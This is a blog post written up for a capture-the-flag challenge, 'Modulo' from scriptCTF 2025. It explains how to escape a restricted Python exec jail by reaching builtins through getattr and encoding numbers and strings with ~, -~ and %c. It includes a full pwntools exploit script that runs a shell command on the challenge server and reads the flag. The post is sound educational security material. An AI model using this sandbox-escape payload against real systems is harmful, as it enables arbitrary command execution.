---
title: "script25: Writeup for Misc/Modulo"
date: 2025-08-18T12:42:40+01:00
tags: ["ctf", "write-up", "scriptCTF"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Modulo"
summary: "Python jail challenge exploited via `getattr`, circumventing AST and character restrictions, dynamically generating numbers and strings with `%c` achieving remote code execution."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

* CTF: Script CTF 2025
* Challenge: Modulo
* Category: Miscellaneous
* Points: 500 (20 solves)
* Description:

> Modulo is so cool!

![challenge description](/blog/images/2025-08-18-12-54-06.png)

* Author: [NoobMaster](https://discord.com/users/779212906918051860)
* Attachments:
    * [jail.py](https://storage.googleapis.com/scriptctf-wave2-randomchars1337/Misc/Modulo/jail.py)
    * [Dockerfile](https://storage.googleapis.com/scriptctf-wave2-randomchars1337/Misc/Modulo/Dockerfile)

## TL;DR

This challenge is a Python “jail” that restricts user input as follows:

* **NO** lowercase letters
* **NO** numbers
* **NO** binary operators **EXCEPT** for modulo (%)

We exploit it by using `getattr` to reach builtins, then import `os.system` to execute system commands.

Numbers and strings are generated dynamically using a combination of the modulo operator, format strings, the walrus assignment and comparison.

Final payload executes arbitrary shell commands remotely.

{{< notice tip >}}
Tip: skip to exploitation if you only care about the payload
{{< /notice >}}

## Initial Analysis

```py
import ast
print("Welcome to the jail! You're never gonna escape!")
payload = input("Enter payload: ") # No uppercase needed
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist

tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod): # Modulo because why not?
            raise ValueError("I don't like math :(")
exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
print('Bye!')
```

At first glance, this is clearly a python jail. We can input a string that will be
executed as python code, but only after rigurous sanitization and restriction.

In order to escape the jail, we first need to understand what our goal is, and what restrictions are put onto us.

The first is achieved by figuring our sink, i.e. the dangerous function that we should
target to get code execution, which in this case is [exec](https://docs.python.org/3/library/functions.html#exec).

![exec(source, /, globals=None, locals=None, *, closure=None)](/blog/images/2025-08-18-14-20-47.png)

`exec` takes a string `source` (`payload` in this case) and parses it as a suite of Python
statements which is then executed (unless a syntax error occurs).

The next parameter provided in the challenge code is `globals`, which is a dictionary
containing references used to interact with objects. Providing `{ '__builtins__': {} }`
deletes all references to builtin functions. Fortunately for us, the actual functions
still exist, and we just need a way to reach them. Thanks to python's introspection feature,
and the fact that the reference to [`getattr`](https://docs.python.org/3/library/functions.html#getattr), a builtin,
is provided, we can reach for other builtins this way:

```py
>>> getattr.__self__
<module 'builtins' (built-in)>
```

{{< notice tip >}}
Tip: __self__ refers to the builtins instance object to which getattr is bound
{{< /notice >}}

Having understood this, we create a proof of concept as follows:

```py
# payload
>>> getattr.__self__.__import__("os").system("echo hello, world!")
hello, world!
0
```

> `getattr` will be refered to as `c`, because that's the name it's been given in the challenge

Nice, if we have no restrictions, we can execute code the following way:

```py
>>> payload = 'c.__self__.__import__("os").system("ls")'
>>> exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
... print('Bye!')
...
challenge  playground  README.md
Bye!
```

## Task Analysis

Now that we understand our goal. Let's see how the jail prevents our initial payload from working.

### 1st restriction

```py
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist
```

Our payload should:

1. Contain only uppercase printable ASCII ([Unicode confusions](https://util.unicode.org/UnicodeJsps/confusables.jsp?a=flag&r=None) won't work here).
2. Use at most one comparison operator `<` OR `>` ([Shifting Gimmicks](https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html) aren't possible)
3. Use at most one assignment.

The only allowed lowercase character is `c`, we'll see how to use that later.

### 2nd restriction

```py
tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod): # Modulo because why not?
            raise ValueError("I don't like math :(")
```

Here, our payload is parsed into an [abstract syntax tree](https://en.wikipedia.org/wiki/Abstract_syntax_tree),
which is a structured representation of python code that can be inspected before execution, namely:

* If any binary operator occurs in our payload => It has to be a modulo (`%`)

What constitutes a binOP though?

The full list of Python binary operators that can appear in an [ast.BinOp](https://docs.python.org/3/library/ast.html#ast.BinOp) node is:

* Add (`+`)
* Sub (`-`)
* Mult (`*`)
* Div (`/`)
* FloorDiv (`//`)
* Mod (`%`)
* Pow (`**`)
* LShift (`<<`)
* RShift (`>>`)
* BitOr (`|`)
* BitXor (`^`)
* BitAnd (`&`)
* MatMult (`@`)

Damn~ what are we even left with?

### Taking a step back

The restrictions do seem daunting indeed, so we need to orient ourself to get ahead.

Our initial working payload is this:

```py
c.__self__.__import__("os").system("ls")
```

Many characters are blocked, so let's walk through them sequentially and see what we can fix:

1. We can use `c` alright, so we'll leave that be.
2. dots `.` are blocked. Let's stop here.

Reading the [getattr](https://docs.python.org/3/library/functions.html#getattr) documentation says:

* `getattr(obj, "field")` is equivalent to `obj.field`

![getattr and dot equivalence](/blog/images/2025-08-18-15-03-26.png)

Nice, let's replace dots with the other representation then:

```py
# >>> c = getattr
>>> c(c(c(c, "__self__"), "__import__")("os"), "system")("ls")
challenge  playground  README.md
0
```

If you see now, the new payload doesn't have much we need to change, except for the string literals.

The question then is: How can we generate strings under these restrictions?

### Generating strings (part 1)

If you're familiar with C, and wrote a hello world program before, you know that
printing a string requires format specifiers, which build strings using other value types.

![C hello world program](/blog/images/2025-08-19-10-39-15.png)

Python has the same [printf-style-formatting](https://docs.python.org/3/library/stdtypes.html#printf-style-bytes-formatting). You can do `format % values` to generate a string, more specifically:

* `%c` as format will take integers and converts them to characters

just like this:

```py
>>> '%c' % 65
'A'
```

The [doc](https://docs.python.org/3/library/stdtypes.html#printf-style-bytes-formatting) also states we can build a string using multiple specifiers and wrapping values inside a tuple.

just like this:

```py
>>> '%c%c' % (65, 66)
'AB'
```

Awesome, we can build strings using numbers!

but wait~ numbers are blocked too!

![frustrated](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExaWFvcDFrYWN2cDAxNWFudmFlazFuenBtYXlyYmlmbGI2NHp5b2lwOSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/pynZagVcYxVUk/giphy.gif)

> At this point my teammate @sleep_well. came and finished off the challenge, kudos to him :)

### Generating strings (part 2)

It turns out we can be persistent and ask another question:

* How can we generate numbers using OTHER things.

It you studied logic in uni, you probably have heard that everything can be built using NAND gates,
NOT-AND. Well, we can use a similar idea in this case.

Numbers in python are represented using 2's complement (the memories~). This kind of representation
allows us to represent numbers, zero for example as (00000000) where the **most significant bit** indicates
**sign** (0 being positive, 1 otherwise).

Another detail regarding 2's complement is that reading numbers is done by keeping the first
1 from the right and flipping subsequent digits (right to left) to get the actual value.

So (11111111) in 2's complement is actually -1 (-00000001)

If you still haven't noticed, we can transition from 0 to -1 by flipping all bits in the number,
the syntax for this *negation* is `~`:

```py
>>> ~0 == -1
True
```

Moreover, if we do `-~0`, we'll end up with `1` instead of `-1`, repeat the whole process
again and you can increment 1 to 2, 2 to 3 and so on.

```py
>>> x = -~0
>>> x
1
>>> -~x
2
>>> x = -~x
>>> -~x
3
```

Awesome! we can get all numbers this way, but our base is still a number 😔

Is there something in python equivalent to numbers?

The answer is YES! and again, if you're familiar with C, you know that **FALSE** and **TRUE** are just
[macros](https://gcc.gnu.org/onlinedocs/cpp/Macros.html) for **0** and **1** respectively. More interestingly, if we check whether `False` is an instance of `int`, we get `True`

```py
>>> isinstance(False, int)
True
```

This means that `~False` will also give -1! and remember our comparison and assignment? we can do `X='A'>'B'`,
and now X holds `False` which we can use to generate numbers, by extension strings.

## Exploitaiton

Armed with this knowledge, we just need to put few puzzle pieces together. We will:

1. Convert a string to a format payload ('%c%c...')
2. Take the numbers in the generated string in step 1 and convert them to `-~X` representation
3. Piece everything together to get the payload
4. Use pwntools (optional) to deliver the exploit and get the flag.

### Step 1: str_to_fmt_payload

```py
def str_to_fmt_payload(s: str) -> str:
    """
    Convert a string into a format string payload like:
    '%c%c' % (<encoded ord(c1)>, <encoded ord(c2)>)
    """
    fmt = "%s" % ("%c" * len(s))  # e.g. "%c%c%c"
    encoded_numbers = ", ".join(encode_number(ord(ch)) for ch in s)
    return f"'{fmt}'%({encoded_numbers})"
```

{{< notice tip >}}
Tip: %s means insert the string representation of the object here.
{{< /notice >}}

### Step 2: encode_number

```py
def encode_number(n: int) -> str:
    """
    Encode an integer n using only ~ and -~ starting from 0.
    """
    if n == 0:
        return "X"  # special case
    parts = []
    if n > 0:
        # n times increment: -~0, -~-~0, ...
        expr = "X"
        for _ in range(n):
            expr = f"-~{expr}"
        return expr
    else:
        # negative numbers using ~
        expr = "X"
        for _ in range(-n):
            expr = f"~{expr}"
        return expr
```

### Step 3: payload creation

```py
X_assignment = "(X := ('A' > 'B'))"
get_builtins = f"c(c(c(c, {str_to_fmt_payload('__self__')}), {str_to_fmt_payload('__import__')})({str_to_fmt_payload('os')}), {str_to_fmt_payload('system')})"
command = str_to_fmt_payload(cmd)

payload = f"{X_assignment}, {get_builtins}({command})"
```

{{< notice tip >}}
Tip: the walrus operator (:=) along with the parantheses are necessary for correct statement prioritization, without them exec will fail.
{{< /notice >}}

### Putting everything together

```py
from pwn import *

# connect to the remote host
p = remote("play.scriptsorcerers.xyz", 10085)

# cmd = input("Command: ")
cmd = "cat /home/chall/flag.txt"

# receive the banner
print(p.recvuntil(b"Enter payload: "))

def encode_number(n: int) -> str:
    """
    Encode an integer n using only ~ and -~ starting from 0.
    """
    if n == 0:
        return "X"  # special case
    parts = []
    if n > 0:
        # n times increment: -~0, -~-~0, ...
        expr = "X"
        for _ in range(n):
            expr = f"-~{expr}"
        return expr
    else:
        # negative numbers using ~
        expr = "X"
        for _ in range(-n):
            expr = f"~{expr}"
        return expr


def str_to_fmt_payload(s: str) -> str:
    """
    Convert a string into a format string payload like:
    '%c%c' % (<encoded ord(c1)>, <encoded ord(c2)>)
    """
    fmt = "%s" % ("%c" * len(s))  # e.g. "%c%c%c"
    encoded_numbers = ", ".join(encode_number(ord(ch)) for ch in s)
    return f"'{fmt}'%({encoded_numbers})"


X_assignment = "(X := ('A' > 'B'))"
get_builtins = f"c(c(c(c, {str_to_fmt_payload('__self__')}), {str_to_fmt_payload('__import__')})({str_to_fmt_payload('os')}), {str_to_fmt_payload('system')})"
command = str_to_fmt_payload(cmd)

payload = f"{X_assignment}, {get_builtins}({command})"

p.sendline(payload)

# read the response
print(p.recvall().decode())
```

![delivering exploit script](/blog/images/2025-08-18-15-41-42.png)

---

Flag is: `scriptCTF{my_p4yl04d_1s_0v3r_15k_by73s_y0urs?_71fe41d51449}`

![freedom](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3l5aW50bGpqaW1kaGt3OGxzYXA1aG04bG1kMXFkMzJod2F4dnQyZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6Mbe0ztNWW9mGhu8/giphy.gif)

## Conclusions

* The challenge demonstrates a **Python “jail”** restricting strings, numbers, lowercase letters, and binary operations.
* Exploitation requires careful **abuse of introspection**, specifically `getattr.__self__` to reach builtins.
* **Dynamic string and number generation** using format specifiers (`%c`) and bitwise operations (`~` and `-~`) allows bypassing character restrictions.
* The **walrus operator (`:=`)** is essential to create temporary variables for number generation while satisfying the one-assignment restriction.
* Understanding Python’s **AST (`ast.BinOp`)** and operator restrictions is crucial for crafting valid payloads.
* Overall, the challenge reinforces **creative thinking under syntactic constraints** and highlights Python’s introspection capabilities for exploitation.

## References

* [Python `exec()` documentation](https://docs.python.org/3/library/functions.html#exec) – Explains the behavior of the exec function.
* [Python `getattr()` documentation](https://docs.python.org/3/library/functions.html#getattr) – Shows how to access attributes dynamically.
* [AST module (`ast`) documentation](https://docs.python.org/3/library/ast.html) – Used to analyze Python code structure.
* [Python printf-style string formatting](https://docs.python.org/3/library/stdtypes.html#printf-style-bytes-formatting) – Technique to generate strings dynamically.
* [Python walrus operator (`:=`)](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions) – Essential for temporary assignment expressions.
* [Pyjail bypass techniques](https://shirajuki.js.org/blog/pyjail-cheatsheet/) – Examples of common Python sandbox escapes.
* [2's complement and bitwise operations in Python](https://en.wikipedia.org/wiki/Two%27s_complement) – Understanding number generation using `~` and `-~`.

